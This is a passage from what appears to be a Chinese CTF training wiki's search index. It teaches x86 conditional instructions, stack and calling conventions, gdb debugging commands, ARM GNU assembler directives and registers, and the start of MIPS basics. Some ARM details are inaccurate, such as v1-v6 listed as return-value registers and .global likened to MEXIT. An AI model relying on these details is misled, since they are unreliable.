\u7684\u72b6\u6001\u5c06\u76ee\u6807\u5bc4\u5b58\u5668\u8bbe\u7f6e\u4e3a 0 \u6216 1. <code>cmovx</code> \u6307\u4ee4\u6839\u636e\u6761\u4ef6 x \u662f\u5426\u6210\u7acb\u6765\u6709\u6761\u4ef6\u5730\u6267\u884c mov. x \u662f\u4efb\u4f55\u6761\u4ef6\u53d8\u91cf\u7684\u5360\u4f4d\u7b26, \u5c31\u662f\u8bf4 x \u53ef\u4ee5\u7528\u8fd9\u4e9b\u6765\u4ee3\u66ff : e, ne, s, ns. \u5b83\u4eec\u7684\u610f\u601d\u4e0a\u9762\u4e5f\u90fd\u8bf4\u8fc7\u4e86.</p> <pre><code>sete dst ;\u6839\u636e \u96f6/\u76f8\u7b49( zero/equal ) \u6761\u4ef6\u6765\u628a dst \u8bbe\u7f6e\u6210 0 \u6216 1\nsetge dst ;\u6839\u636e \u5927\u4e8e/\u76f8\u7b49( greater/equal ) \u6761\u4ef6\u6765\u628a dst \u8bbe\u7f6e\u6210 0 \u6216 1\ncmovns src, dst ;\u5982\u679c ns \u6761\u4ef6\u6210\u7acb, \u5219\u7ee7\u7eed\u6267\u884c mov\ncmovle src, dst ;\u5982\u679c le \u6761\u4ef6\u6210\u7acb, \u5219\u7ee7\u7eed\u6267\u884c mov\n</code></pre> <p>\u5bf9\u4e8e <code>setx</code> \u6307\u4ee4, \u5176\u76ee\u6807\u5fc5\u987b\u662f\u5355\u5b57\u8282\u5bc4\u5b58\u5668 ( \u4f8b\u5982 %al \u7528\u4e8e %rax \u7684\u4f4e\u5b57\u8282 ). \u5bf9\u4e8e <code>cmovx</code> \u6307\u4ee4, \u5176\u6765\u6e90\u548c\u53bb\u8def\u90fd\u5fc5\u987b\u662f\u5bc4\u5b58\u5668.</p>"},{"location":"Training/Material/Reverse/#_14","title":"\u51fd\u6570\u8c03\u7528\u4e0e\u6808","text":"<p>%rsp \u5bc4\u5b58\u5668\u7528\u4f5c \" \u6808\u6307\u9488 \"; <code>push</code> \u548c <code>pop</code> \u7528\u4e8e\u6dfb\u52a0\u6216\u8005\u5220\u9664\u6808\u5185\u5b58\u4e2d\u7684\u503c. <code>push</code> \u6307\u4ee4\u53ea\u6709\u4e00\u4e2a\u53c2\u6570, \u8fd9\u4e2a\u53c2\u6570\u662f\u7acb\u5373\u6570\u5e38\u6570, \u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143. <code>push</code> \u6307\u4ee4\u5148\u628a %rsp \u7684\u503c\u9012\u51cf, \u7136\u540e\u5c06\u53c2\u6570\u590d\u5236\u5230\u6808\u5185\u5b58\u4e0a\u7684 tompost. <code>pop</code> \u6307\u4ee4\u4e5f\u53ea\u6709\u4e00\u4e2a\u53c2\u6570, \u5373\u76ee\u6807\u5bc4\u5b58\u5668. <code>pop</code> \u5148\u628a\u6808\u5185\u5b58\u6700\u9876\u5c42\u7684\u503c\u590d\u5236\u5230\u76ee\u6807\u5bc4\u5b58\u5668, \u7136\u540e\u628a %rsp \u9012\u589e. \u76f4\u63a5\u8c03\u6574 %rsp, \u4ee5\u901a\u8fc7\u5355\u4e2a\u53c2\u6570\u6dfb\u52a0\u6216\u5220\u9664\u6574\u4e2a\u6570\u7ec4\u6216\u53d8\u91cf\u96c6\u5408\u4e5f\u662f\u53ef\u4ee5\u7684. \u4f46\u6ce8\u610f, \u6808\u5185\u5b58\u662f\u671d\u4e0b\u589e\u957f ( \u5373\u671d\u5411\u8f83\u4f4e\u5730\u5740 ).</p> <pre><code>push %rbx ;\u628a %rbx \u5165\u6808\npushq $0x3 ;\u628a\u7acb\u5373\u6570 3 \u5165\u6808\nsub $0x10, %rsp ;\u8c03\u6574\u6808\u6307\u9488\u4ee5\u7a7a\u51fa 16 \u5b57\u8282\n\npop %rax ;\u628a\u6808\u4e2d\u6700\u9876\u5c42\u7684\u503c\u51fa\u6808\u5230\u5bc4\u5b58\u5668 %rax \u4e2d\nadd $0x10, %rsp ;\u8c03\u6574\u6808\u6307\u9488\u4ee5\u5220\u9664\u6700\u9876\u5c42\u7684 16 \u4e2a\u5b57\u8282\n</code></pre> <p>\u51fd\u6570\u4e4b\u95f4\u662f\u901a\u8fc7\u4e92\u76f8\u8c03\u7528\u8fd4\u56de\u6765\u4e92\u76f8\u63a7\u5236\u7684. <code>callq</code> \u6307\u4ee4\u6709\u4e00\u4e2a\u53c2\u6570, \u5373\u88ab\u8c03\u7528\u7684\u51fd\u6570\u7684\u5730\u5740. \u5b83\u5c06\u8fd4\u56de\u6765\u7684\u5730\u5740\u5165\u6808, \u8fd9\u4e2a\u8fd4\u56de\u6765\u7684\u5730\u5740\u5373 %rip \u5f53\u524d\u7684\u503c, \u4e5f\u5373\u662f\u8c03\u7528\u51fd\u6570\u540e\u7684\u4e0b\u4e00\u6761\u6307\u4ee4. \u7136\u540e\u8fd9\u4e2a\u6307\u4ee4\u8ba9\u7a0b\u5e8f\u8df3\u8f6c\u5230\u88ab\u8c03\u7528\u7684\u51fd\u6570\u7684\u5730\u5740. <code>retq</code> \u6307\u4ee4\u628a\u521a\u624d\u5165\u6808\u7684\u5730\u5740\u7ed9\u51fa\u6808, \u8ba9\u5b83\u56de\u5230 %rip \u4e2d, \u4ece\u800c\u8ba9\u7a0b\u5e8f\u5728\u4fdd\u5b58\u7684\u8fd4\u56de\u5730\u5740\u5904\u91cd\u65b0\u5f00\u59cb, \u5c31\u662f\u8bf4\u4f60\u4e2d\u9014\u8df3\u5230\u522b\u7684\u5730\u65b9\u53bb, \u4f60\u56de\u6765\u7684\u65f6\u5019\u8981\u4ece\u4f60\u8df3\u7684\u90a3\u4e2a\u5730\u65b9\u91cd\u65b0\u5f00\u59cb.</p> <p>\u5f53\u7136, \u4f60\u5982\u679c\u8981\u8bbe\u7f6e\u8fd9\u79cd\u51fd\u6570\u95f4\u7684\u4e92\u76f8\u8c03\u7528, \u8c03\u7528\u8005\u9700\u8981\u5c06\u524d\u516d\u4e2a\u53c2\u6570\u653e\u5165\u5bc4\u5b58\u5668 %rdi, %rsi, %rdx, %rcx, %r8 \u548c %r9 ( \u4efb\u4f55\u5176\u5b83\u53c2\u6570\u90fd\u5165\u6808 ), \u7136\u540e\u518d\u6267\u884c\u8c03\u7528\u6307\u4ee4.</p> <pre><code>mov $0x3, %rdi ;\u7b2c\u4e00\u4e2a\u53c2\u6570\u5728 %rdi \u4e2d\nmov $0x7, %rsi ;\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5728 %rsi \u4e2d\ncallq binky ;\u628a\u7a0b\u5e8f\u4ea4\u7ed9 binky \u63a7\u5236\n</code></pre> <p>\u5f53\u88ab\u8c03\u7528\u8005\u90a3\u4e2a\u51fd\u6570\u5b8c\u4e8b\u7684\u65f6\u5019, \u8fd9\u4e2a\u51fd\u6570\u5c06\u8fd4\u56de\u503c ( \u5982\u679c\u6709\u7684\u8bdd ) \u5199\u5165 %rax, \u7136\u540e\u6e05\u7406\u6808\u5185\u5b58, \u5e76\u4f7f\u7528 <code>retq</code> \u6307\u4ee4\u628a\u7a0b\u5e8f\u63a7\u5236\u6743\u4ea4\u8fd8\u7ed9\u8c03\u7528\u8005.</p> <pre><code>mov $0x0, %eax ;\u5c06\u8fd4\u56de\u503c\u5199\u5165 %rax\nadd $0x10, %rsp ;\u6e05\u7406\u6808\u5185\u5b58\nretq ;\u4ea4\u8fd8\u63a7\u5236\u6743, \u8df3\u56de\u53bb\n</code></pre> <p>\u8fd9\u4e9b\u5206\u652f\u8df3\u8f6c\u6307\u4ee4\u7684\u76ee\u6807\u901a\u5e38\u662f\u5728\u7f16\u8bd1\u65f6\u786e\u5b9a\u7684\u7edd\u5bf9\u5730\u5740. \u4f46\u662f, \u6709\u4e9b\u60c5\u51b5\u4e0b\u76f4\u5230\u8fd0\u884c\u7a0b\u5e8f\u7684\u65f6\u5019, \u6211\u4eec\u624d\u77e5\u9053\u76ee\u6807\u7684\u7edd\u5bf9\u5185\u5b58\u5730\u5740. \u4f8b\u5982\u7f16\u8bd1\u4e3a\u8df3\u8f6c\u8868\u7684 switch \u8bed\u53e5\u6216\u8c03\u7528\u51fd\u6570\u6307\u9488\u65f6. \u5bf9\u4e8e\u8fd9\u4e9b, \u6211\u4eec\u5148\u8ba1\u7b97\u76ee\u6807\u5730\u5740, \u7136\u540e\u628a\u5730\u5740\u5b58\u5230\u5bc4\u5b58\u5668\u4e2d, \u7136\u540e\u7528 \u5206\u652f/\u8c03\u7528( branch/call ) \u53d8\u91cf <code>je *%rax</code> \u6216 <code>callq *%rax</code> \u4ece\u6307\u5b9a\u5bc4\u5b58\u5668\u4e2d\u8bfb\u53d6\u76ee\u6807\u5730\u5740.</p> <p>\u5f53\u7136\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5, \u5c31\u662f\u4e0a\u4e00\u8282\u8bb2\u7684\u6253\u6807\u7b7e.</p>"},{"location":"Training/Material/Reverse/#345-gdb","title":"3.4.5 \u6c47\u7f16\u548c gdb","text":"<p>\u8c03\u8bd5\u5668 ( debugger ) \u6709\u8bb8\u591a\u529f\u80fd, \u8fd9\u53ef\u4ee5\u8ba9\u4f60\u53ef\u4ee5\u5728\u7a0b\u5e8f\u4e2d\u8ffd\u8e2a\u548c\u8c03\u8bd5\u4ee3\u7801. \u4f60\u53ef\u4ee5\u901a\u8fc7\u5728\u5176\u540d\u79f0\u4e0a\u52a0\u4e2a $ \u6765\u6253\u5370\u5bc4\u5b58\u5668\u4e2d\u7684\u503c, \u6216\u8005\u4f7f\u7528\u547d\u4ee4 info reg \u8f6c\u50a8\u6240\u6709\u5bc4\u5b58\u5668\u7684\u503c :</p> <pre><code>(gdb) p $rsp\n(gdb) info reg\n</code></pre> <p><code>disassemble</code> \u547d\u4ee4\u6309\u7167\u540d\u79f0\u6253\u5370\u51fd\u6570\u7684\u53cd\u6c47\u7f16. <code>x</code> \u547d\u4ee4\u652f\u6301 i \u683c\u5f0f, \u8fd9\u4e2a\u683c\u5f0f\u628a\u5185\u5b58\u5730\u5740\u7684\u5185\u5bb9\u89e3\u91ca\u4e3a\u7f16\u7801\u6307\u4ee4 ( \u89e3\u7801 ).</p> <pre><code>(gdb) disassemble main //\u53cd\u6c47\u7f16, \u7136\u540e\u6253\u5370\u6240\u6709 main \u51fd\u6570\u7684\u6307\u4ee4\n(gdb) x/8i main //\u53cd\u6c47\u7f16, \u7136\u540e\u6253\u5370\u5f00\u59cb\u7684 8 \u6761\u6307\u4ee4\n</code></pre> <p>\u4f60\u53ef\u4ee5\u901a\u8fc7\u5728\u51fd\u6570\u4e2d\u7684\u76f4\u63a5\u5730\u5740\u6216\u504f\u79fb\u91cf\u4e3a\u7279\u5b9a\u6c47\u7f16\u6307\u4ee4\u8bbe\u7f6e\u65ad\u70b9.</p> <pre><code>(gdb) b *0x08048375\n(gdb) b *main+7 //\u5728 main+7\u4e2a\u5b57\u8282\u8fd9\u91cc\u8bbe\u7f6e\u65ad\u70b9\n</code></pre> <p>\u4f60\u53ef\u4ee5\u7528 <code>stepi</code> \u548c <code>nexti</code> \u547d\u4ee4\u6765\u8ba9\u7a0b\u5e8f\u901a\u8fc7\u6307\u4ee4 ( \u800c\u4e0d\u662f\u6e90\u4ee3\u7801 ) \u5f80\u524d\u6267\u884c.</p> <pre><code>(gdb) stepi\n(gdb) nexti\n</code></pre>"},{"location":"Training/Material/Reverse/#35-arm","title":"3.5 ARM\u6c47\u7f16\u57fa\u7840","text":""},{"location":"Training/Material/Reverse/#351","title":"3.5.1 \u5f15\u8a00","text":"<p>\u672c\u7ae0\u6240\u8bb2\u8ff0\u7684\u662f\u5728 GNU \u6c47\u7f16\u7a0b\u5e8f\u4e0b\u7684 ARM \u6c47\u7f16\u5feb\u901f\u6307\u5357\uff0c\u800c\u6240\u6709\u7684\u4ee3\u7801\u793a\u4f8b\u90fd\u4f1a\u91c7\u7528\u4e0b\u9762\u7684\u7ed3\u6784\uff1a</p> <pre><code>[&lt; \u6807\u7b7e label :]  {&lt;\u6307\u4ee4 instruction or directive } @ \u6ce8\u91ca comment\n</code></pre> <p>\u5728 GNU \u7a0b\u5e8f\u4e2d\u4e0d\u9700\u8981\u7f29\u8fdb\u6307\u4ee4\u3002\u7a0b\u5e8f\u7684\u6807\u7b7e\u662f\u7531\u5192\u53f7\u8bc6\u522b\u800c\u4e0e\u6240\u5904\u7684\u4f4d\u7f6e\u65e0\u5173\u3002 \u5c31\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\uff1a</p> <pre><code>.section .text, \"x\"\n.global   add @\u7ed9\u7b26\u53f7\u6dfb\u52a0\u5916\u90e8\u94fe\u63a5\nadd:\n       ADD    r0, r0, r1    @\u6dfb\u52a0\u8f93\u5165\u53c2\u6570\n      MOV    pc, lr         @\u4ece\u5b50\u7a0b\u5e8f\u8fd4\u56de\n                            @\u7a0b\u5e8f\u7ed3\u675f\n</code></pre> <p>\u5b83\u5b9a\u4e49\u7684\u662f\u4e00\u4e2a\u8fd4\u56de\u603b\u548c\u51fd\u6570 \u201c add \u201d\uff0c\u5141\u8bb8\u4e24\u4e2a\u8f93\u5165\u53c2\u6570\u3002\u901a\u8fc7\u4e86\u89e3\u8fd9\u4e2a\u7a0b\u5e8f\u5b9e\u4f8b\uff0c\u60f3\u5fc5\u63a5\u4e0b\u6765\u8fd9\u7c7b\u7a0b\u5e8f\u7684\u7406\u89e3\u6211\u4eec\u4e5f\u80fd\u591f\u5f88\u597d\u7684\u7684\u638c\u63e1\u3002</p>"},{"location":"Training/Material/Reverse/#352-arm-gnu","title":"3.5.2 ARM \u7684 GNU \u6c47\u7f16\u7a0b\u5e8f\u6307\u4ee4\u8868","text":"<p>\u5728 GNU \u6c47\u7f16\u7a0b\u5e8f\u4e0b\u7684 ARM \u6307\u4ee4\u96c6\u6db5\u62ec\u5982\u4e0b\uff1a</p> GUN \u6c47\u7f16\u7a0b\u5e8f\u6307\u4ee4 \u63cf\u8ff0 <code>.ascii \"&lt;string&gt;\"</code> \u5c06\u5b57\u7b26\u4e32\u4f5c\u4e3a\u6570\u636e\u63d2\u5165\u5230\u7a0b\u5e8f\u4e2d <code>.asciz \"&lt;string&gt;\"</code> \u4e0e .ascii \u7c7b\u4f3c\uff0c\u4f46\u8ddf\u968f\u5b57\u7b26\u4e32\u7684\u96f6\u5b57\u8282 <code>.balign &lt;power_of_2&gt; {,&lt;fill_value&gt;{,&lt;max_padding&gt;} }</code> \u5c06\u5730\u5740\u4e0e <code>&lt;power_of_2&gt;</code> \u5b57\u8282\u5bf9\u9f50\u3002 \u6c47\u7f16\u7a0b\u5e8f\u901a\u8fc7\u6dfb\u52a0\u503c <code>&lt;fill_value&gt;</code> \u7684\u5b57\u8282\u6216\u5408\u9002\u7684\u9ed8\u8ba4\u503c\u6765\u5bf9\u9f50. \u5982\u679c\u9700\u8981\u8d85\u8fc7 <code>&lt;max_padding&gt;</code> \u8fd9\u4e2a\u6570\u5b57\u6765\u586b\u5145\u5b57\u8282\uff0c\u5219\u4e0d\u4f1a\u53d1\u751f\u5bf9\u9f50\uff08 \u7c7b\u4f3c\u4e8earmasm \u4e2d\u7684 ALIGN \uff09 <code>.byte &lt;byte1&gt; {,&lt;byte2&gt; } \u2026</code> \u5c06\u4e00\u4e2a\u5b57\u8282\u503c\u5217\u8868\u4f5c\u4e3a\u6570\u636e\u63d2\u5165\u5230\u7a0b\u5e8f\u4e2d <code>.code &lt;number_of_bits&gt;</code> \u4ee5\u4f4d\u4e3a\u5355\u4f4d\u8bbe\u7f6e\u6307\u4ee4\u5bbd\u5ea6\u3002 \u4f7f\u7528 16 \u8868\u793a Thumb\uff0c32 \u8868\u793a ARM \u7a0b\u5e8f\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 CODE16 \u548c CODE32 \uff09 <code>.else</code> \u4e0e.if\u548c .endif \u4e00\u8d77\u4f7f\u7528\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 ELSE \uff09 <code>.end</code> \u6807\u8bb0\u7a0b\u5e8f\u6587\u4ef6\u7684\u7ed3\u5c3e\uff08 \u901a\u5e38\u7701\u7565 \uff09 <code>.endif</code> \u7ed3\u675f\u6761\u4ef6\u7f16\u8bd1\u4ee3\u7801\u5757 - \u53c2\u89c1.if\uff0c.ifdef\uff0c.ifndef\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 ENDIF \uff09 <code>.endm</code> \u7ed3\u675f\u5b8f\u5b9a\u4e49 - \u8bf7\u53c2\u9605 .macro\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 MEND \uff09 <code>.endr</code> \u7ed3\u675f\u91cd\u590d\u5faa\u73af - \u53c2\u89c1 .rept \u548c .irp\uff08\u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 WEND \uff09 <code>.equ &lt;symbol name&gt;, &lt;vallue&gt;</code> \u8be5\u6307\u4ee4\u8bbe\u7f6e\u7b26\u53f7\u7684\u503c\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 EQU \uff09 <code>.err</code> \u8fd9\u4e2a\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u505c\u6b62\u5e76\u51fa\u73b0\u9519\u8bef <code>.exitm</code> \u4e2d\u9014\u9000\u51fa\u4e00\u4e2a\u5b8f - \u53c2\u89c1 .macro\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 MEXIT \uff09 <code>.global &lt;symbol&gt;</code> \u8be5\u6307\u4ee4\u7ed9\u51fa\u7b26\u53f7\u5916\u90e8\u94fe\u63a5\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 MEXIT \uff09\u3002 <code>.hword &lt;short1&gt; {,&lt;short2&gt; }...</code> \u5c0616\u4f4d\u503c\u5217\u8868\u4f5c\u4e3a\u6570\u636e\u63d2\u5165\u5230\u7a0b\u5e8f\u4e2d\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 DCW \uff09 <code>.if &lt;logical_expression&gt;</code> \u628a\u4e00\u6bb5\u4ee3\u7801\u53d8\u6210\u524d\u63d0\u6761\u4ef6\u3002 \u4f7f\u7528 .endif \u7ed3\u675f\u4ee3\u7801\u5757\uff08 \u7c7b\u4f3c\u4e8e armasm\u4e2d\u7684 IF \uff09\u3002 \u53e6\u89c1 .else <code>.ifdef &lt;symbol&gt;</code> \u5982\u679c\u5b9a\u4e49\u4e86 <code>&lt;symbol&gt;</code>\uff0c\u5219\u5305\u542b\u4e00\u6bb5\u4ee3\u7801\u3002 \u7ed3\u675f\u4ee3\u7801\u5757\u7528 .endif, \u8fd9\u5c31\u662f\u4e2a\u6761\u4ef6\u5224\u65ad\u561b, \u5f88\u7b80\u5355\u7684. <code>.ifndef &lt;symbol&gt;</code> \u5982\u679c\u672a\u5b9a\u4e49 <code>&lt;symbol&gt;</code>\uff0c\u5219\u5305\u542b\u4e00\u6bb5\u4ee3\u7801\u3002 \u7ed3\u675f\u4ee3\u7801\u5757\u7528 .endif, \u540c\u4e0a. <code>.include \"&lt;filename&gt;\"</code> \u5305\u62ec\u6307\u5b9a\u7684\u6e90\u6587\u4ef6, \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 INCLUDE \u6216 C \u4e2d\u7684#include <code>.irp &lt;param&gt; {,&lt;val 1&gt;} {,&lt;val_2&gt;} ...</code> \u4e3a\u503c\u5217\u8868\u4e2d\u7684\u6bcf\u4e2a\u503c\u91cd\u590d\u4e00\u6b21\u4ee3\u7801\u5757\u3002 \u4f7f\u7528 .endr \u6307\u4ee4\u6807\u8bb0\u5757\u7684\u7ed3\u5c3e\u3002 \u5728\u91cc\u9762\u91cd\u590d\u4ee3\u7801\u5757\uff0c\u4f7f\u7528 <code>\\&lt;param&gt;</code> \u66ff\u6362\u5173\u8054\u7684\u4ee3\u7801\u5757\u503c\u5217\u8868\u4e2d\u7684\u503c\u3002 <code>.macro &lt;name&gt; {&lt;arg_1&gt;} {,&lt; arg_2&gt;} ... {,&lt;arg_N&gt;}</code> \u4f7f\u7528 N \u4e2a\u53c2\u6570\u5b9a\u4e49\u540d\u4e3a<code>&lt;name&gt;</code>\u7684\u6c47\u7f16\u7a0b\u5e8f\u5b8f\u3002\u5b8f\u5b9a\u4e49\u5fc5\u987b\u4ee5 <code>.endm</code> \u7ed3\u5c3e\u3002 \u8981\u5728\u8f83\u65e9\u7684\u65f6\u5019\u4ece\u5b8f\u4e2d\u9003\u8131\uff0c\u8bf7\u4f7f\u7528 <code>.exitm</code>\u3002 \u8fd9\u4e9b\u6307\u4ee4\u662f\u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 MACRO\uff0cMEND \u548cMEXIT\u3002 \u4f60\u5fc5\u987b\u5728\u865a\u62df\u5b8f\u53c2\u6570\u524d\u9762\u52a0 <code>\\</code>. <code>.rept &lt;number_of_times&gt;</code> \u91cd\u590d\u7ed9\u5b9a\u6b21\u6570\u7684\u4ee3\u7801\u5757\u3002 \u4ee5<code>.endr</code>\u7ed3\u675f\u3002 <code>&lt;register_name&gt; .req &lt;register_name&gt;</code> \u8be5\u6307\u4ee4\u547d\u540d\u4e00\u4e2a\u5bc4\u5b58\u5668\u3002 \u5b83\u4e0e armasm \u4e2d\u7684 <code>RN</code> \u6307\u4ee4\u7c7b\u4f3c\uff0c\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u60a8\u5fc5\u987b\u5728\u53f3\u4fa7\u63d0\u4f9b\u540d\u79f0\u800c\u4e0d\u662f\u6570\u5b57\uff08\u4f8b\u5982\uff0c<code>acc .req r0</code>\uff09 <code>.section &lt;section_name&gt; {,\"&lt;flags&gt; \"}</code> \u542f\u52a8\u65b0\u7684\u4ee3\u7801\u6216\u6570\u636e\u90e8\u5206\u3002 GNU \u4e2d\u6709\u8fd9\u4e9b\u90e8\u5206:<code>.text</code>\u4ee3\u7801\u90e8\u5206;<code>.data</code>\u521d\u59cb\u5316\u6570\u636e\u90e8\u5206\u548c<code>.bss</code>\u672a\u521d\u59cb\u5316\u6570\u636e\u90e8\u5206\u3002 \u8fd9\u4e9b\u90e8\u5206\u6709\u9ed8\u8ba4\u503cflags\u548c\u94fe\u63a5\u5668\u7406\u89e3\u9ed8\u8ba4\u540d\u79f0\uff08\u4e0earmasm\u6307\u4ee4AREA\u7c7b\u4f3c\u7684\u6307\u4ee4\uff09\u3002 \u4ee5\u4e0b\u662f ELF \u683c\u5f0f\u6587\u4ef6\u5141\u8bb8\u7684 .section\u6807\u5fd7\uff1a a \u8868\u793a allowable section w \u8868\u793a writable section x \u8868\u793a executable section <code>.set &lt;variable_name&gt;, &lt;variable_value&gt;</code> \u8be5\u6307\u4ee4\u8bbe\u7f6e\u53d8\u91cf\u7684\u503c\u3002 \u5b83\u7c7b\u4f3c\u4e8e SETA\u3002 <code>.space &lt;number_of_bytes&gt; {,&lt;fill_byte&gt; }</code> \u4fdd\u7559\u7ed9\u5b9a\u7684\u5b57\u8282\u6570\u3002 \u5982\u679c\u6307\u5b9a\u4e86\u5b57\u8282\uff0c\u5219\u586b\u5145\u96f6\u6216 <code>&lt;fill_byte&gt;</code>\uff08\u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 SPACE\uff09 <code>.word &lt;word1&gt; {,&lt;word2&gt;}...</code> \u5c06 32 \u4f4d\u5b57\u503c\u5217\u8868\u4f5c\u4e3a\u6570\u636e\u63d2\u5165\u5230\u7a0b\u5e8f\u96c6\u4e2d\uff08\u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 DCD\uff09\u3002"},{"location":"Training/Material/Reverse/#353","title":"3.5.3 \u5bc4\u5b58\u5668\u540d\u79f0","text":"<p>\u901a\u7528\u5bc4\u5b58\u5668\uff1a</p> <p>%r0 - %r15</p> <p>fp \u5bc4\u5b58\u5668\uff1a</p> <p>%f0 - %f7</p> <p>\u4e34\u65f6\u5bc4\u5b58\u5668\uff1a</p> <p>%r0 - %r3, %r12</p> <p>\u4fdd\u5b58\u5bc4\u5b58\u5668\uff1a</p> <p>%r4 - %r10</p> <p>\u5806\u6808 ptr \u5bc4\u5b58\u5668\uff1a</p> <p>%sp</p> <p>\u5e27 ptr \u5bc4\u5b58\u5668\uff1a</p> <p>%fp</p> <p>\u94fe\u63a5\u5bc4\u5b58\u5668\uff1a</p> <p>%lr</p> <p>\u7a0b\u5e8f\u8ba1\u6570\u5668\uff1a</p> <p>%ip</p> <p>\u72b6\u6001\u5bc4\u5b58\u5668\uff1a</p> <p>$psw</p> <p>\u72b6\u6001\u6807\u5fd7\u5bc4\u5b58\u5668\uff1a</p> <p>xPSR</p> <p>xPSR_all</p> <p>xPSR_f</p> <p>xPSR_x</p> <p>xPSR_ctl</p> <p>xPSR_fs</p> <p>xPSR_fx</p> <p>xPSR_fc</p> <p>xPSR_cs</p> <p>xPSR_cf</p> <p>xPSR_cx</p>"},{"location":"Training/Material/Reverse/#354","title":"3.5.4 \u6c47\u7f16\u7a0b\u5e8f\u7279\u6b8a\u5b57\u7b26/\u8bed\u6cd5","text":"<p>\u5185\u8054\u8bc4\u8bba\u5b57\u7b26\uff1a '@'</p> <p>\u884c\u8bc4\u8bba\u5b57\u7b26\uff1a '\uff03'</p> <p>\u8bed\u53e5\u5206\u9694\u7b26\uff1a ';'</p> <p>\u7acb\u5373\u64cd\u4f5c\u6570\u524d\u7f00\uff1a '\uff03' \u6216 '$'</p>"},{"location":"Training/Material/Reverse/#355-arm","title":"3.5.5 arm\u7a0b\u5e8f\u8c03\u7528\u6807\u51c6","text":"<p>\u53c2\u6570\u5bc4\u5b58\u5668 \uff1a\uff05a0 - \uff05a4\uff08\u522b\u540d\u4e3a\uff05r0 - \uff05r4\uff09</p> <p>\u8fd4\u56de\u503cregs \uff1a\uff05v1 - \uff05v6\uff08\u522b\u540d\u4e3a\uff05r4 - \uff05r9\uff09</p>"},{"location":"Training/Material/Reverse/#356","title":"3.5.6 \u5bfb\u5740\u6a21\u5f0f","text":"<p><code>addr</code> \u7edd\u5bf9\u5bfb\u5740\u6a21\u5f0f</p> <p><code>\uff05rn</code> \u5bc4\u5b58\u5668\u76f4\u63a5\u5bfb\u5740</p> <p><code>[\uff05rn]</code> \u5bc4\u5b58\u5668\u95f4\u63a5\u5bfb\u5740\u6216\u7d22\u5f15</p> <p><code>[\uff05rn\uff0c\uff03n]</code> \u57fa\u4e8e\u5bc4\u5b58\u5668\u7684\u504f\u79fb\u91cf</p> <p>\u4e0a\u8ff0 \"rn\" \u6307\u4efb\u610f\u5bc4\u5b58\u5668\uff0c\u4f46\u4e0d\u5305\u62ec\u63a7\u5236\u5bc4\u5b58\u5668\u3002</p>"},{"location":"Training/Material/Reverse/#357","title":"3.5.7 \u673a\u5668\u76f8\u5173\u6307\u4ee4","text":"\u6307\u4ee4 \u63cf\u8ff0 .arm \u4f7f\u7528arm\u6a21\u5f0f\u8fdb\u884c\u88c5\u914d .thumb \u4f7f\u7528thumb\u6a21\u5f0f\u8fdb\u884c\u88c5\u914d .code16 \u4f7f\u7528thumb\u6a21\u5f0f\u8fdb\u884c\u88c5\u914d .code32 \u4f7f\u7528arm\u6a21\u5f0f\u8fdb\u884c\u7ec4\u88c5 .force_thumb Force thumb\u6a21\u5f0f\uff08\u5373\u4f7f\u4e0d\u652f\u6301\uff09 .thumb_func \u5c06\u8f93\u5165\u70b9\u6807\u8bb0\u4e3athumb\u7f16\u7801\uff08\u5f3a\u5236bx\u6761\u76ee\uff09 .ltorg \u542f\u52a8\u4e00\u4e2a\u65b0\u7684\u6587\u5b57\u6c60"},{"location":"Training/Material/Reverse/#36-mips","title":"3.6 MIPS\u6c47\u7f16\u57fa\u7840","text":""},{"location":"Training/Material/Reverse/#_15","title":"\u6570\u636e\u7c7b\u578b\u548c\u5e38\u91cf","text":"<ul> <li>\u6570\u636e\u7c7b\u578b\uff1a</li> <li>\u6307\u4ee4\u5168\u662f32\u4f4d</li> <li>\u5b57\u8282\uff088\u4f4d\uff09\uff0c\u534a\u5b57\uff082\u5b57\u8282\uff09\uff0c\u5b57\uff084\u5b57\u8282\uff09</li> <li>\u4e00\u4e2a\u5b57\u7b26\u9700\u89811\u4e2a\u5b57\u8282\u7684\u5b58\u50a8\u7a7a\u95f4</li> <li>\u6574\u6570\u9700\u89811\u4e2a\u5b57\uff084\u4e2a\u5b57\u8282\uff09\u7684\u5b58\u50a8\u7a7a\u95f4</li> <li>\u5e38\u91cf\uff1a</li> <li>\u6309\u539f\u6837\u8f93\u5165\u7684\u6570\u5b57\u3002\u4f8b\u5982 4</li> <li>\u7528\u5355\u5f15\u53f7\u62ec\u8d77\u6765\u7684\u5b57\u7b26\u3002\u4f8b\u5982 'b'</li> <li>\u7528\u53cc\u5f15\u53f7\u62ec\u8d77\u6765\u7684\u5b57\u7b26\u4e32\u3002\u4f8b\u5982 \u201cA string\u201d</li> </ul>"},{"location":"Training/Material/Reverse/#_16","title":"\u5bc4\u5b58\u5668","text":"<ul> <li>32\u4e2a\u901a\u7528\u5bc4\u5b58\u5668</li> <li>\u5bc4\u5b58\u5668\u524d\u9762\u6709 $</li> </ul> <p>\u4e24\u79cd\u683c\u5f0f\u7528\u4e8e\u5bfb\u5740\uff1a</p> <ul> <li>\u4f7f\u7528\u5bc4\u5b58\u5668\u53f7\u7801\uff0c\u4f8b\u5982 <code>$ 0</code> \u5230 <code>$ 31</code></li> <li>\u4f7f\u7528\u522b\u540d\uff0c\u4f8b\u5982 <code>$ t1</code>\uff0c<code>$ sp</code></li> <li>\u7279\u6b8a\u5bc4\u5b58\u5668 Lo \u548c Hi 